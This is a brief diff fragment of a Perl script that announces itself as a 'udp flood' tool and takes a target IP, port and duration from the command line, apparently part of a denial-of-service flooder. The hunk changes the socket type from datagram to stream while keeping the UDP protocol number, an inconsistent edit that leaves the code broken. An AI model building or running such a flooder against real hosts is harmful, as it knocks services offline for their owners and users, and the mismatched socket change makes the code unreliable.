@@ -21,7 +21,7 @@ my ($ip,$port,$size,$time);
  $port=$ARGV[1];
  $time=$ARGV[2];
 
-socket(crazy, PF_INET, SOCK_DGRAM, 17);
+socket(crazy, PF_INET, SOCK_STREAM, 17);
     $iaddr = inet_aton("$ip");
 
 printf "udp flood - ibo\n";
